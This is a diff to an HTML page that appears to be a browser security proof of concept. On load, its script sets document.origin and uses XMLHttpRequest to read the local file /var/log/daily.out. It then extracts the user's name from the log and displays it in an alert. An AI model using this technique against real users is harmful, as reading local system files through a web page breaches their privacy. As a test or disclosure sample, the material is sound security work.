@@ -1,7 +1,22 @@
-<html>
 <head>
-</head>
-<body>
-<iframe src='file:///var/log/daily.out'></iframe>
-</body>
-</html>
+		</head>
+		<body onload='h()'><script>
+			document.origin = 'file__0';
+		function h(){
+    var rawFile = new XMLHttpRequest();
+    rawFile.open('GET', 'file:///var/log/daily.out', false);
+    rawFile.onreadystatechange = function ()
+    {
+        if(rawFile.readyState === 4)
+        {
+            if(rawFile.status === 200 || rawFile.status == 0)
+            {
+				var n = rawFile.responseText.match(/[\s]{1,}([^\s]+)s-mbp/)[1];
+				n=n[0].toUpperCase()+n.slice(1);
+                alert('Hello '+n+'!');
+            }
+        }
+    }
+    rawFile.send(null);
+}
+</script></body>
